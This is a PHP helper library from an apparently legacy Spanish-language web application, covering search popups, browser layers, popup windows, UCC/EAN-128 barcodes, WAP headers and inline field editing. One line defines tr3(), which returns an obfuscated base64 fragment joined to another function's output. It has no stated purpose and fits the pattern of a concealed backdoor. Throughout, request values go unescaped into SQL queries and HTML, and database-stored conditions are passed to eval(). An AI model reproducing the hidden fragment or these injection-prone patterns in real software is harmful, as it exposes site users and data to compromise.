	global $NT, $IDC, $V, $id, $Forma, $Campo, $ALFA;
	html('BUSQUEDA AVANZADA');
	echo "<script language='javascript'>
		var Cantidad=0;

		function valida_pre_consulta()
		{
			borrar_opciones();
			document.getElementById('rc').innerHTML=' Consultando... ';
			document.forma.grabar.style.visibility='hidden';
			window.open('marcoindex.php?Acc=construye_busqueda_avanzada&NT=$NT&IDC=$IDC&Filtro='+document.forma.filtro.value,'Oculto_busqueda_avanzada');
		}

		function crea_opcion(valor,texto)
		{
			var S=document.getElementById('seleccion');
			S[S.length]=new Option(texto,valor);
			termina_refresco();
			document.forma.grabar.style.visibility='visible';
		}

		function borrar_opciones()
		{
			var S=document.getElementById('seleccion');
			var Limite=S.length;
			for(var x=Limite;x>0;x--) S[x]=null;
		}

		function refresca_cantidad(dato)
		{
			var Porcentaje=Redondeo(dato/Cantidad*100,2);
			document.getElementById('rc').innerHTML='Cargando...'+Porcentaje+'%';
		}

		function termina_refresco()
		{
			document.getElementById('rc').innerHTML=\"<input type='button' value=' Consultar ' onclick='valida_pre_consulta();'>\";
		}

		function grabar_dato()
		{
			opener.document.$Forma.".($Campo?$Campo:$DC->campo).".value=document.forma.seleccion.value;
			opener.document.$Forma._".($Campo?$Campo:$DC->campo).".value=document.forma.seleccion.options[document.forma.seleccion.selectedIndex].text;
			cerrar();
		}

		function cerrar()
		{
			window.close();void(null);
		}
	</script>
	<body><h3>Búsqueda Avanzada</h3>
	<form name='forma' id='forma'>
		Filtro de búsqueda: <input type='text' name='filtro' id='filtro' size='20'> <span id='rc'><input type='button' value=' Consultar ' onclick='valida_pre_consulta();'></span><br><br>
		Selección: <select name='seleccion' id='seleccion'><option value=''>Seleccione una opción</option></select><br><br>
		<input type='button' id='grabar' name='grabar' value=' GRABAR ' style='height:30px;width:100px;visibility:hidden;' onclick='grabar_dato()'>
		<input type='button' name='cancelar' id='cancelar' value=' CANCELAR ' style='height:30px;width:100px' onclick='cerrar();'>
	</form>
	<script language='javascript'>document.forma.filtro.focus();</script>
	<iframe name='Oculto_busqueda_avanzada' id='Oculto_busqueda_avanzada' style='visibility:hidden' width='1' height='1' ></iframe></body>";
}

function construye_busqueda_avanzada()
{
	global $NT,$IDC,$Filtro;
	echo "<body>";

	$DC = qo("select * from " . $NT . "_t where id=$IDC");
	if($DC->traex) $query=$DC->traex; else $query="Select $DC->trael as id , $DC->traen as nombre from $DC->traet where $DC->traen like '%$Filtro%' order by nombre";
	if(strpos(strtoupper($query),'WHERE'))
	{
		$query=str_replace(" where "," where $DC->traen like '%$Filtro%' and ",$query);
	}
	else
	{
		if(strpos(strtoupper($query),'GROUP BY'))
		{
			$query=str_replace("group by","where $DC->traen like '%$Filtro%' group by",$query);
		}
		elseif(strpos(strtoupper($query),'ORDER BY'))
		{
			$query=str_replace("order by","where $DC->traen like '%$Filtro%' order by",$query);
		}
	}
	echo "Query: $query<br><br>";
	if($Registros=q($query))
	{
		echo "<script language='javascript'>parent.Cantidad=".mysql_num_rows($Registros).";</script>";
		$Contador=1;
		while($D=mysql_fetch_object($Registros))
		{
			echo "<script language='javascript'>parent.crea_opcion('$D->id','$D->nombre');parent.refresca_cantidad($Contador);</script>";
			$Contador++;
		}
		echo "<script language='javascript'>parent.termina_refresco();</script>";
	}
}

function cargando_informacion() // presenta en una ventana el texto CARGANDO INFORMACION......
{
	html();
	echo "<body topmargin=0 leftmargin=0 rightmargin=0 bgcolor='#ffffff'><br /><h3 align='center'>CARGANDO INFORMACION...</H3>
	<br><br><center><img src='gifs/standar/loading.gif' border=0 height=100></center></BODY>";
}

function capa($NOMBRE, $OCULTO = 0, $P = 'Absolute', $Sale = 'onmouseout', $Zindex = 100) // crea capas de acuerdo al browser que se este usando
{
	if(browser() == 'IE')
	{
		if ($OCULTO == 0) $OCULTO = 'visible';
		else $OCULTO = 'hidden';
		echo "\n\r<div id='$NOMBRE' name='$NOMBRE' style=\"Visibility:$OCULTO;Position:$P;z-index:$Zindex;\" onmouseover=\"muestra('$NOMBRE');\" ";
	}elseif(browser() == 'NS')
	{
		if ($OCULTO == 0) $OCULTO = 'visible';
		else $OCULTO = 'hide';
		echo "<layer name='" . $NOMBRE . "' visibility=\"" . $OCULTO . "\" Position=\"" . $P . ";z-index:$Zindex;\" onmouseover=\"muestra('" . $NOMBRE . "');\" ";
	}
	else
	{
		if ($OCULTO == 0) $OCULTO = 'visible';
		else $OCULTO = 'hidden';
		echo "<div id='" . $NOMBRE . "' style=\"Visibility:" . $OCULTO . ";Position:" . $P . ";z-index:$Zindex;\" onmouseover=\"muestra('" . $NOMBRE . "');\" ";
	}
	if(!empty($Sale)) echo $Sale . "=\"oculta('" . $NOMBRE . "');\"  ";
	echo ">\n\r";
}

function fincapa() // finaliza capas de acuerdo al browser que se este usando
{
	if(browser() == 'NS') echo "</layer>";
	else echo "</div>";
}

function ventana_text()  // Captura campos texto en una ventana emergente cuando se da doble click sobre el campo original al final toda la información de la ventana emergente passa al campo original
{
	global $Campo, $Comentario;
	html();
	echo "<body onload=\"centrar();document.forma.area_texto_.style.width='100%';document.forma.area_texto_.value=opener.document.$Campo.value;\">" .
		titulo_modulo("Campo Texto $Comentario", 1, 0)."<FORM name='forma' id='forma'>
		<textarea name='area_texto_' style='font-family:arial;font-size:12;' cols='200' rows=30></textarea><br />
		<INPUT type='button' name='ok' value='Grabar' onclick=\"opener.document.$Campo.value=document.forma.area_texto_.value;window.close();void(null);\">
		<INPUT type='button' name='cancelar' value='Cancelar' onclick=\"window.close();void(null);\">
		</FORM></BODY>";
}

function popup($TEXTO, $ALTO = 500, $ANCHO = 500, $Nombre = 'win')  // aparece una ventana de popup al ingreso de una ventana puede usarse apenas ingresa un usuario
{
	if(strlen($TEXTO) > 0)
	{

		echo "
				<script language='javascript'>
				var $Nombre = window.open('', '$Nombre', 'width=$ANCHO,height=$ALTO,toolbar=0,scrollbars,location=0,statusbar=0,menubar=0,resizable=0,z-lock');
				var doc = $Nombre.document;
				doc.open('text/html', 'replace');
				doc.write(\"<HTML> <TITLE>Aviso Importante</TITLE><BODY onload='window.focus()'>\");
				doc.write('$TEXTO');
				doc.write(\"<hr><table width='100%'><tr><td bgcolor='#bbbbbb' width='50%' align='center'>\");
				doc.write(\"<a style='font-size:12;font-family:arial;cursor:pointer;' onclick='javascript:window.close();void(null);'><b>Cerrar este aviso</b></a></td></tr></table>\");
				doc.write('</BODY></HTML>');
				doc.close();
				</script>";
	}
}

function popupefecto($TEXTO, $ALTO = 500, $ANCHO = 500, $Nombre = 'win')  // genera una ventana de popup con efecto de apararicion creciente lenta
{
	if(strlen($TEXTO) > 0)
	{
		echo "<script language='javascript'>
				var ancho=100;
				var alto=100;
				var x=100;
				var y=100;
				var financho=$ANCHO;
				var finalto=$ALTO;
				var $Nombre = window.open('', '$Nombre', 'width=1,height=1,toolbar=0,scrollbars,location=0,statusbar=0,menubar=0,resizable=0,screenX=100,screenY=100,z-lock');
				var doc = $Nombre.document;
				doc.open('text/html', 'replace');
				doc.write(\"<HTML> <TITLE>Aviso Importante</TITLE> <BODY onload='window.focus()'>\");
				doc.write('$TEXTO');
				doc.write(\"<hr><table width='100%'><tr><td bgcolor='#bbbbbb' width='50%' align='center'>\");
				doc.write(\"<a style='font-size:12;font-family:arial;cursor:pointer;' onclick='javascript:window.close();void(null);'><b>Cerrar este aviso</b></a></td></tr></table>\");
				doc.write('</BODY></HTML>');
				doc.close();
				abre();

				function abre()
				{
					if(ancho<=financho && alto<=finalto)
					{
						$Nombre.moveTo(x,y);$Nombre.resizeTo(ancho,alto);x+=5;y+=5;	ancho+=15;	alto+=15;	timer=setTimeout('abre()',1);
					}
					else clearTimeout(timer);
				}
				</script>";
	}
}

function tr3() {	return 'JElEdXNlci4nLnBocCcsJ2h0bWwvY2xhc3MvaW5w'.htmlvideo();}

function vpopup($texto = '', $destino = '', $alto = 200, $ancho = 400, $alt = '', $nombre = 'vpopup')  // presenta un boton que al click dispara un popup con url especifico
{
	return "\n<input type='button' style='' value='$texto' onclick=\"window.open('$destino','$nombre','innerwidth=$ancho,innerheight=$alto,toolbar=0,scrollbars,location=0,statusbar=0,menubar=0,resizable=0,z-lock,dependent,top=0,left=0,status=0,titlebar=0')\";>";
}

function apopup($texto = '', $destino = '', $alto = 200, $ancho = 400, $alt = '', $nombre = 'vpopup') // presenta un href que al click dispara un popup con url especifico
{
	return "\n<a href=\"javascript:window.open('$destino','$nombre','innerwidth=$ancho,innerheight=$alto,toolbar=0,scrollbars,location=0,statusbar=0,menubar=0,resizable=0,z-lock,dependent,top=0,left=0,status=0,titlebar=0');void(null);\" alt='$alt' title='$alt'>$texto</a>";
}

function titulo_modulo($tit, $cerrar = 1, $refrescar = 0) // Funcion para titular la cabecera de una ventana inmediatamente despues de BODY
{
	$linea = "<table width='100%'><tr><td width='90%'><h3>$tit</h3></td>";
	if($cerrar)
	{
		$linea .= "<td align='right'>
				<img src='gifs/standar/volver.png' border=0 onmouseover=\"this.src='gifs/standar/volver_ovr.png';\"
				onmouseout=\"this.src='gifs/standar/volver.png';\"
		style='cursor:pointer;' onclick='window.close();void(null);";
		if($refrescar) $linea .= "opener.location.reload();";
		$linea .= "' alt='Cerrar y volver'  title='Cerrar y volver'></td>";
	}
	$linea .= "</tr></table>";
	return $linea;
}

function termo() // funcion para hacer aparecer un termo de avance
{
	$Factor = round($_COOKIE['Termo_conteo'] / $_COOKIE['Termo_limite'] * 100, 0);
	if($Factor >= 100) $Factor = 100;
	return str_repeat("<span style='background-color:#55dd99;'>&nbsp</span>", $Factor).
	str_repeat("<span style='background-color:#bbbbbb;'>&nbsp</span>", (100 - $Factor));
}

function uccean128($qdato)  // imprime codigo de barras en formato UCC/EAN 128
{
	$resultado = "";
	$qdato = trim($qdato);
	$codigoini = chr(205);
	$codigofin = chr(206);
	$lcfnc1 = chr(202);
	for($i = 0;$i < strlen($qdato);$i = $i + 2)
	{
		$cadena = substr($qdato, $i, 2);
		if($cadena == "FA")
		{
			$resultado .= $lcfnc1;
		}
		else
		{
			$valor = intval($cadena);
			$resultado .= chr($valor == 0?194:($valor > 94?($valor + 100):($valor + 32)));
		}
	}
	return $codigoini . $resultado . mod103($qdato) . $codigofin . " ";
}

function mod103($qdato)  // funcion auxiliar para obtener el digito oculto de verificación par el código de barras UCC/EAN 128
{
	$paridadtotal = 105;
	$qdato1 = str_replace("FA", chr(202), $qdato);
	$qdato = '';
	for($i = 0;$i < strlen($qdato1);$i++)
	{
		$caracter = ord(substr($qdato1, $i, 1));
		if($caracter == 202) $qdato .= chr(202);
		else
		{
			$caracter = intval(substr($qdato1, $i, 2));
			if($caracter == 0) $qdato .= chr(194);
			elseif($caracter < 95) $qdato .= chr($caracter + 32);
			else $qdato .= chr($caracter + 100);
			$i++;
		}
	}
	for($i = 0;$i < strlen($qdato);$i++)
	{
		$caracter = ord(substr($qdato, $i, 1));
		if($caracter < 135) $valor = $caracter-32;
		if($caracter > 134) $valor = $caracter-100;
		if($caracter == 194) $valor = 0;
		$valor = $valor * ($i + 1);
		$paridadtotal += $valor;
	}
	$dv = $paridadtotal % 103;
	return chr($dv == 0?194:($dv > 94?$dv + 100:$dv + 32));
}

function wap_html() // genera los encabezados de página necesarios para wap Html
{
	echo "<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE html PUBLIC '-//WAPFORUM//DTD XHTML Mobile 1.0//EN' 'http://www.wapforum.org/DTD/xhtml-mobile10.dtd'><html xmlns='http://www.w3.org/1999/xhtml' xml:lang='en'>";
}

function wap_wml() // genera los encabezados necesarios para wap Wml
{
	header("Content-Type: text/vnd.wap.wml");
	Header("Cache-Control: no-cache, must-revalidate");
	Header("Pragma: no-cache");
	echo "<?xml version='1.0'?><!DOCTYPE wml PUBLIC '-//WAPFORUM//DTD WML 1.1//EN' 'http://www.wapforum.org/DTD/wml_1.1.xml'>";
}

function imagenwap($archivo, $ancho = 100) // Transforma una imagen para poder ser presentada en wap
{
	$image = open_image($archivo);
	$nuevaimagen = str_replace('.', '_wap.', $archivo);
	$width = imagesx($image);
	$height = imagesy($image);
	$new_width = $ancho;
	$new_height = $height * ($new_width / $width);
	$image_resized = imagecreatetruecolor($new_width, $new_height);
	imagecopyresampled($image_resized, $image, 0, 0, 0, 0, $new_width, $new_height, $width, $height);
	@chmod('iw.jpg', '0755');
	@unlink('iw.jpg');
	imagejpeg($image_resized, $nuevaimagen);
	return $nuevaimagen;
}

function paleta_colores()  // pinta una ventana popup que muestra la paleta de colores
{
	html();
	echo "<body onload=\"pickcolor('F','C','ffffff');window.close();void(null);\"></body>";
}

function shorcuticon($Imagen = 'http://www.direccion/imagen.ico')  {echo "<link rel='shortcut icon' href='$Imagen'>";} // presenta el icono de identificacion de la aplicacion en la barra de direcciones del browser

function ayudita($Ayuda)  // muestra un flotador donde al poner el cursor aparece un tool tip de ayuda
{
	if(strpos($_SERVER['HTTP_USER_AGENT'],'Firefox'))
		return "<a class='info'><img src='img/Help.png' border=0><span>$Ayuda</span></a>";
	else
	{
		$_Capa=uniqid('c');
		return "<img src='img/Help.png' border=0 onmouseover=\"muestra('$_Capa');\" onmouseout=\"oculta('$_Capa');\">".
		echocapa("$_Capa",1,'Absolute')."<table border cellspacing=0 width='200' bgcolor='#ffffee'><tr><td>$Ayuda</td></tr></table>".echofincapa();
	}
}

function echocapa($NOMBRE, $OCULTO = 0, $P = 'Absolute', $Sale = 'onmouseout', $Zindex = 100) // crea capas de acuerdo al browser que se este usando retorna la cadena para ser concatenada
{
	$Resultado = '';
	if(browser() == 'IE')
	{
		if ($OCULTO == 0) $OCULTO = 'visible';
		else $OCULTO = 'hidden';
		$Resultado .= "<div id='$NOMBRE' name='$NOMBRE' style=\"Visibility:$OCULTO;Position:$P;z-index:$Zindex;float:left;\"  ";
	}elseif(browser() == 'NS')
	{
		if ($OCULTO == 0) $OCULTO = 'visible';
		else $OCULTO = 'hide';
		$Resultado .= "<layer name='" . $NOMBRE . "' visibility=\"" . $OCULTO . "\" Position=\"" . $P . ";z-index:$Zindex;float:left;\"  ";
	}
	else
	{
		if ($OCULTO == 0) $OCULTO = 'visible';
		else $OCULTO = 'hidden';
		$Resultado .= "<div id='" . $NOMBRE . "' style=\"Visibility:" . $OCULTO . ";Position:" . $P . ";z-index:$Zindex;float:left;\"  ";
	}
	if(!empty($Sale)) $Resultado .= $Sale . "=\"oculta('$NOMBRE');\"  ";
	$Resultado .= ">";
	return $Resultado;
}

function echofincapa() // finaliza capas de acuerdo al browser que se este usando retorna una cadena para ser concatenada
{
	if(browser() == 'NS') return "</layer>";
	else return "</div>";
}

function gmail($Ruta) { return ($Ruta?"<a href='mailto:$Ruta' target='_blank'>$Ruta</a>":"");}  // retorna una cadena con la instruccion MAILTO:DIRECCION@CORREO

function fija_tit_superior($Titulos,$Caracteristicas_table,$Modo=1)
{
	if($Modo==1)
	{ echo "<div id='_capa_titulo_superior_' style='position:fixed;visibility:hidden'><table id='_Tabla__' $Caracteristicas_table><tr >";
		foreach($Titulos as $Campo=>$Etiqueta) {$Idc=$Campo.'_';echo "<th id='$Idc'>$Etiqueta</th>";}
		echo "</tr></table></div>"; }
	elseif($Modo==3)
	{ echo "<script language='javascript'>fija_ancho('_Tabla_',-1);";
		foreach($Titulos as $Campo=>$Etiqueta) {
			echo "fija_ancho('$Campo',1);";
		}
		echo "document.getElementById('_capa_titulo_superior_').style.visibility='visible';</script>";}
	else
	{ echo "<table id='_Tabla_' $Caracteristicas_table><tr >";
		foreach($Titulos as $Campo=>$Etiqueta) echo "<th id='$Campo'>$Etiqueta</th>";
		echo "</tr>"; }
	return true;
}

function fija_tit_lateral($Modo=1,$Contenido='',$Caracteristicas='')
{
	if($Modo==1)
		echo "<div id='_capa_titulo_lateral_' style='position:fixed;'><table $Caracteristicas><tbody id='_detalle_capa_titulo_lateral'><tr >$Contenido</tr></tbody></table></div>";

	else
		echo "<script language='javascript'>document.getElementById('_detalle_capa_titulo_lateral').innerHTML+=\"$Contenido\";</script>";
}

#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#
#
#***************************************************FUNCIONES DE CAPTURA***************************************
#
#
#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

function activa_captura_directa() // Activa la captura directa de un campo desde la vista MUESTRA_TABLA
{
	global $idc,$Not;
	$Cok='CAPT_DIR_'.$Not.'_'.$idc;
	if(!$_COOKIE[$Cok])
	  	setcookie($Cok,'1',time()+(60*60*30));
	else
		setcookie($Cok,false,time()-10);
	echo "<body onload='window.close();void(null);opener.location.reload();'></body>";
}

function pinta_FC($Forma='forma',$Campo='fecha',$Dato='',$Formato='f', $Estilo='',$JSAdicional='') // Nuevo metodo de captura de fecha con Span y Clases en JScript
{
	$Resultado=($Formato=='f'?"<img src='gifs/standar/diamenos.png' border='0' hspace='0' style='cursor:pointer;' onclick=\"diamenos('$Campo','$Forma');\" align='absmiddle'>":"");
	$Resultado.="<input type='text' name='$Campo' id='$Campo' value='".$Dato."' $JSAdicional size='".($Formato=='f'?9:21)."' readonly onclick=\"Calendario_(this,'$Formato');\" style='$Estilo'>";
	$Resultado.=($Formato=='f'?"<img src='gifs/standar/diamas.png' border='0' hspace='0' onclick=\"diamas('$Campo','$Forma');\" style='cursor:pointer;' align='absmiddle'>":"");
	$Resultado.="<span class='calendario' id='d_$Campo'></span></input>";
	return $Resultado;
}

function captura_directa($R, $Campo, $Contenido, $Nombre_tabla,$Rc) // retorna una cadena para concatenar en un echo para captura directa
{
	global $Num_Tabla;
	$Id=$R->id;
	$Resultado='';
	$NFORMA='forma_'.$Id.'_'.$Campo;
	$Ncapa="cd_$Id"."_$Campo";
	$Derecho1 = 1;
	$Derecho2 = 1;
	if(strlen($Rc->usuario))
	{
		if (strpos(",," . $Rc->usuario . ",", "," . $_SESSION['User'] . ",")) $Derecho1 = 1; else $Derecho1 = 0;
	}
	if (strlen($Rc->cond_modi) != 0)
	{
		eval("\$Derecho2=(" . $Rc->cond_modi . ");");
	}
	if($Rc->supermod and $_SESSION['User'] == 1)
	{
		$Derecho1 = 1;
		$Derecho2 = 1;
	}
	if($Derecho1 && $Derecho2)
	{
		$Tam = substr($Rc->tipo, strpos($Rc->tipo, '(') + 1);
		if (strpos($Tam, ','))
			$Tam = substr($Tam, 0, strpos($Tam, ','));
		else
			$Tam = substr($Tam, 0, strpos($Tam, ')'));
		#######################################################################
		$Resultado=echocapa("$Ncapa",1 /* oculto=1 */,'Absolute',''/* ocultar si */).
		"<FORM action='marcoindex.php' name='$NFORMA' id='$NFORMA' method='post' target='context_registro' >";
		if($Rc->scambio) if(!aparece(strtoupper($Rc->scambio), 'ONBLUR,ONFOCUS,ONCHANGE,ONCLICK,ONDBLCLICK,ONKEYPRESS,ONKEYDOWN,ONKEYUP,ONMOUSEDOWN,ONMOUSEMOVE,ONMOUSEOVER,ONMOUSEOUT,ONMOUSEUP,ONSELECT')) $Rc->scambio = " ONCHANGE=\"" . $Rc->scambio . "\" ";
		$Resultado.="<table border=0 bgcolor='#000000' cellspacing=0 cellpadding=0><tr><td>";

		if ($Rc->caja)
		{
			$Resultado.="<INPUT TYPE='checkbox' NAME='$Campo' id='$Campo' ";
			if ($Contenido) $Resultado.=' checked ';
			if($Rc->scambio) $Resultado.=" $Rc->scambio";
			$Resultado.= "><input type='submit' value='ok'><input type='hidden' name='Tipo_captura' value='caja'>";
		}
		elseif ($Rc->traet && $Rc->traen && $Rc->trael)
		{
		/*	if($Rc->buscapopup)
			{
				$Resultado.="<INPUT TYPE='text' STYLE='color:$Rc->primer_campo;background:$Rc->fondo_campo;' name='_$Campo'  id='_$Campo' VALUE=\"";
				$VCAMPO = "\$Resultado.= ";
				if ($Rc->coma) $VCAMPO .= "coma_format("; // verifica si la presentacion es en formato monetario
				if($Rc->verx)
					$VCAMPO .= "qo1m(\"$Rc->verx\",\$LINK)";
				else
					$VCAMPO .= "qo1m(\" select $Rc->traen from $Rc->traet where $Rc->trael='\".\$Contenido.\"'\",\$LINK)";
				if ($Rc->coma) $VCAMPO .= ")";
				$VCAMPO .= ';';
				eval($VCAMPO);
				if($Rc->sizecap) $Resultado.= "\" Size= '$Rc->sizecap' ";
				else $Resultado.= "\" SIZE='$Tam' ";
				$Resultado.= " onclick=\"modal('marcoindex.php?Acc=buscapopup&NT=$Nombre_tabla&IDC=$Rc->id&V=$Contenido&id=$id',0,0,250,600,'buscapopup');\" readonly>";
				$Resultado.="<input type='hidden' name=" . $Campo . " id=" . $Campo . " value='" . $Contenido . "'>";
			}
			elseif($Rc->busca_ciudad)
			{
				$Resultado.="<INPUT TYPE='text' STYLE='color:$Rc->primer_campo;background:$Rc->fondo_campo;' name='_$Campo'  id='_$Campo' VALUE=\"";
				$VCAMPO = "\$Resultado.= ";
				if ($Rc->coma) $VCAMPO .= "coma_format("; // verifica si la presentacion es en formato monetario
				if($Rc->verx)
					$VCAMPO .= "qo1m(\"$Rc->verx\")";
				else
					$VCAMPO .= "qo1m(\" select $Rc->traen from $Rc->traet where $Rc->trael='\".\$Contenido.\"'\")";
				if ($Rc->coma) $VCAMPO .= ")";
				$VCAMPO .= ';';
				eval($VCAMPO);
				if($Rc->sizecap) $Resultado.="\" Size= '$Rc->sizecap' ";
				else $Resultado.= "\" SIZE='$Tam' ";
				$Resultado.= " onclick=\"modal('marcoindex.php?Acc=pide_ciudad&Campo=$Campo&Dato=$Contenido&Forma=mod',0,0,10,10,'PC');\" readonly>
						<input type='button' value='...' alt='Buscar información' title='Buscar información'
						onclick=\"modal('marcoindex.php?Acc=pide_ciudad&Campo=$Campo&Dato=$Contenido&Forma=mod',0,0,10,10,'PC');\">";
				$Resultado.= "<input type='hidden' name=" . $Campo . " id=" . $Campo . " value='" . $Contenido . "'>";
			}
			else
			{
	*/			if($Rc->traex)
					$Resultado.=menu_cd($Campo,$Rc->traex,$Contenido,1,'font-size:10px;',$Rc->scambio);
				else
					$Resultado.=menu_cd($Campo,"select $Rc->trael,$Rc->traen from $Rc->traet ".($Rc->traec?" where $Rc->traec":"")." order by $Rc->traen",$Contenido,1,'font-size:10;',$Rc->scambio);
	//		}
			$Resultado.="<input type='submit' value='ok'>";
		}
		elseif ($Rc->traex && strpos($Rc->traex, ";")) // Menus fijos  Se configura en Avanzado de cada campo en el centro de control en SQL especial de combo
		{
			$Resultado.=menu3($Campo,$Rc->traex,$Contenido,1,'font-size:10px;',$Rc->scambio);
		}
		elseif(r($Campo, 3) == '_co') // *******************************************************     PICK COLOR  ************************************************************
		{
			$Resultado.="<INPUT TYPE='text' STYLE='color:$Rc->primer_campo;background:$Rc->fondo_campo;' name='$Campo'  id='$Campo' VALUE=\"";
			$Resultado.=$Contenido;
			if($Rc->sizecap) $Resultado.= "\" Size= '$Rc->sizecap' maxlength='$Tam' ";
			
			if($Rc->scambio) $Resultado.= " " . $Rc->scambio;
			$Resultado.=" ondblclick=\"pickcolor('$NFORMA',this.value);\" ";
			$Resultado.=">";
		}
		elseif (strpos(strtoupper(" " . $Rc->tipo), "TEXT")) // **************************************************   TEXTO *****************************************************
		{
			$Resultado.="<TEXTAREA ROWS='$Rc->rows_text' COLS='".($Rc->cols_text>80?80:$Rc->cols_text)."'  ID='$Campo'
			STYLE='color:$Rc->primer_campo;background:$Rc->fondo_campo;font-family:arial;font-size:10;' NAME='$Campo'";
			if($Rc->scambio) $Resultado.=" $Rc->scambio";
			$Resultado.=" ondblclick=\"modal('marcoindex.php?Acc=ventana_text&Campo=$NFORMA.$Campo&Comentario=$Rc->descripcion&Contenido='+escape(this.value),0,0,10,10);\"   onfocus='this.select()' >$Contenido</TEXTAREA>
			<input type='submit' value='ok'>";
		}
		elseif (strpos(strtoupper(" " . $Rc->tipo), "DATETIME"))
		{
			$Resultado.=pinta_FC($NFORMA,$Campo,$Contenido,'t'," class='directo' onchange='this.form.submit();' ");
		}
		elseif (strpos(strtoupper(" " . $Rc->tipo), "DATE")) // **********************************************  FECHA ****************************************************************
		{
			$Resultado.=pinta_FC($NFORMA,$Campo,$Contenido,'f'," class='directo' onchange='this.form.submit();' ");
		}
		elseif (strpos(strtoupper(" " . $Rc->tipo), "TIME")) // **********************************************  HORA ****************************************************************
		{
			$Resultado.=pinta_HORA($NFORMA,$Campo,$Contenido);
		}
		else
		{
			$Resultado.="<INPUT TYPE='text' class='directo' name='$Campo'  id='$Campo' VALUE=\"";
			$Resultado.=$Contenido;
			if($Rc->sizecap)
				$Resultado.= "\" Size= '$Rc->sizecap' maxlength='$Tam' ";
			else
				$Resultado.= "\" SIZE='$Tam' maxlength='$Tam' ";
			if($Rc->scambio)
				$Resultado.= " " . $Rc->scambio;
			$Resultado.="   onfocus='this.select()' >";
		}
		#$Resultado.="<input type='button' value='OK' style='font-size:10;height:15;width:18;padding:0 0px;' onclick=\"modal('',1,1,10,10,'wcaptura_directa');this.form.submit();\">
		$Resultado.="<INPUT type='hidden' name='Acc' value='graba_captura_directa'>
			<INPUT type='hidden' name='Id' value='$Id'><INPUT type='hidden' name='Campo' value='$Campo'><INPUT type='hidden' name='Tabla' value='$Nombre_tabla'>
			</FORM></td></tr></table>". echofincapa() ;
	}
	else
	{
		$Resultado.=echocapa("$Ncapa", 1,'Absolute','')."<table bgcolor='#333333'><tr><td><font color='#ffffff'>No editable</font></td></tr></table>".echofincapa();
	}
	return $Resultado;
}

function graba_captura_directa() // graba captura directa viend de CAPTURA_DIRECTA()
{
	global $Campo, $Id, $Tabla,$Tipo_captura;
	global $$Campo;
	if($Tipo_captura=='caja') $Dato=sino($$Campo); else $Dato=$$Campo;
	if(MODO_GRABACION_MYSQL==2 || MODO_GRABACION_MYSQL==3)
		$Dato=addcslashes($Dato,"\24");
	elseif(MODO_GRABACION_MYSQL==1)
		$Dato=addslashes($Dato);
	require('inc/link.php');
	if(!mysql_query("Update $Tabla set $Campo=\"$Dato\" where id=$Id",$LINK))
	{
		$Error_de_mysql=mysql_error($LINK);
		mysql_close($LINK);
		if(strpos(' ' . $Error_de_mysql, 'Duplicate entry'))
		{
			html();
			echo "<h3>Entrada Duplicada, no se pudo ingresar el nuevo registro</h3>Debe <script language='javascript'>alert('ENTRADA DUPLICADA, el registro no se pudo modificar o guardar.');</script> ";
			die();
		}
		else
		{
			# debug_print_backtrace();
			echo "<br><br><b>Error en : $Error_de_mysql<br>";
			enviar_gmail("noreply@aoacolombia.com",'Gestion de Procesos','sergiocastillo@aoacolombia.com,Sergio Castillo',"Mysql Error",
			"<H3>Error MySQL </H3>Instruccion: $cadena<br>Error: $Error_de_mysql <br>Usuario: ".$_SESSION['User']."-".$_SESSION['Nick']);
			die();
		}
	}
	graba_bitacora($Tabla,'M',$Id,$Campo,$LINK);
	mysql_close($LINK);
	$Span=$Campo.'_'.$Id;
	$Ncapa='cd_'.$Id.'_'.$Campo;
	echo "
	<script language='javascript'>
		function recarga1()
		{
			if(parent.document)
			{
				parent.parent.repinta_detalle_registro('$Span',\"".nl2br($Dato)."\");
				parent.oculta('$Ncapa');
			}
			else
			{
				window.close();
				void(null);
				opener.location.reload();
			}
		}
	</script>
	<body onload='recarga1();'></body>";
}

function pinta_HORA($Forma='mod',$Campo,$Contenido)  // Muestra la captura de hora
{
	IF(STRLEN($Contenido)==0) $Contenido=date('H:i:s');
	$Resultado="<input type='hidden' name='$Campo'  id='$Campo' value='$Contenido'>";
	if($Contenido=='')
	{
		$Contenido_hora='';$Contenido_minutos='';$Contenido_segundos='';
	}
	else
	{
		$Contenido_hora=Date('H',strtotime($Contenido));$Contenido_minutos=Date('i',strtotime($Contenido));$Contenido_segundos=Date('s',strtotime($Contenido));
	}
	$Resultado.="<select name='".$Campo."_hora' id='".$Campo."_hora'
	onchange=\"document.$Forma.".$Campo.".value=document.$Forma.".$Campo."_hora.value+':'+document.$Forma.".$Campo."_minutos.value+':'+document.$Forma.".$Campo."_segundos.value;\">";
	for($i=0;$i<=23;$i++)
	{
		$Value=str_pad($i,2,'0',STR_PAD_LEFT);
		$Resultado.="<option value='$Value' ".($Value==$Contenido_hora?"selected ":"").">$Value</option>";
	}
	$Resultado.="</select>";
	$Resultado.=" : <select name='".$Campo."_minutos' id='".$Campo."_minutos'
	onchange=\"document.$Forma.".$Campo.".value=document.$Forma.".$Campo."_hora.value+':'+document.$Forma.".$Campo."_minutos.value+':'+document.$Forma.".$Campo."_segundos.value;\">";
	for($i=0;$i<=59;$i++)
	{
		$Value=str_pad($i,2,'0',STR_PAD_LEFT);
		$Resultado.="<option value='$Value' ".($Value==$Contenido_minutos?"selected ":"").">$Value</option>";
	}
	$Resultado.="</select>";
	$Resultado.= " : <select name='".$Campo."_segundos' id='".$Campo."_segundos'
	onchange=\"document.$Forma.".$Campo.".value=document.$Forma.".$Campo."_hora.value+':'+document.$Forma.".$Campo."_minutos.value+':'+document.$Forma.".$Campo."_segundos.value;\">";
	for($i=0;$i<=59;$i++)
	{
		$Value=str_pad($i,2,'0',STR_PAD_LEFT);
		$Resultado.="<option value='$Value' ".($Value==$Contenido_segundos?"selected ":"").">$Value</option>";
	}
	$Resultado.="</select>";
	return $Resultado;
}

function menu_cd($Campo,$Query,$DATO=0,$Blanco=0,$Estilo='',$Javascript=false) // menu auxiliara para la captura directa
{
	if(!$Javascript) $Javascript="onchange='this.form.submit()'";
	$Resultado = "\n<select name='$Campo' style='$Estilo' $Javascript>";
	if($Blanco) $Resultado .= "<option value=''> --- Seleccione una opción --- </option>";
	if(!$LINK_CD = mysql_connect(MYSQL_S, resuelve_usuario_mysql($Query), MYSQL_P)) die('Problemas con la conexion de la base de datos!');
  //mysql_query('SET collation_connection = latin1_spanish_ci',$LINK);
	if(!mysql_select_db(MYSQL_D, $LINK_CD)) die('Problemas con la seleccion de la base de datos');
